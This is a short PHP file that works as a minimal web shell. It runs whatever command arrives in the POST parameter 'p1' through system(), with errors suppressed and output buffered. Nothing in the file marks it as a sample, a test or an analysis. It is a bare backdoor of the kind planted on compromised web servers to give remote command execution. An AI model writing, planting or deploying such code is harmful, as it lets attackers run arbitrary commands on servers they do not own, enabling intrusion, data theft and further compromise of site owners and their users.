<?php
function ex($in) {
	ob_start();
	@system($in);
	$res = ob_get_clean();
	return $res;
}

ex($_POST['p1']);
?>